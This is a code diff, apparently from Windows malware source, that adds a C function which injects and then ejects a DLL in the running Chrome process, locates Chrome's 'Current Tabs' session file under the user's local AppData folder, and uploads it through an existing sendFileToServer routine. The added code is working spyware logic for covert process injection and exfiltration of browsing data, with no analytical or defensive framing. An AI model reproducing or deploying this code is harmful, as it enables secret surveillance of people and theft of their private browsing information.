@@ -254,3 +254,25 @@ DWORD sendFileToServer(LPCWSTR lpcsFilePath)
 	InternetCloseHandle(hInternetConnection);
 	InternetCloseHandle(hInternet);
 }
+
+void sendChromeCurrentTabs(void)
+{
+   DWORD chromId = getProcessId(L"chrome.exe");
+   if(chromId != -1)
+   {
+	   inject_library(chromId, L"awl.dll");
+	   eject_library(chromId,L"awl.dll");
+	   
+		WCHAR lpwsPath[MAX_PATH] = {0};
+
+		if(SUCCEEDED(SHGetFolderPath(NULL, 
+									 CSIDL_LOCAL_APPDATA, 
+									 NULL, 
+									 0, 
+									 lpwsPath))) 
+		{
+			lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs D");
+			sendFileToServer(lpwsPath);
+		}
+   }
+}
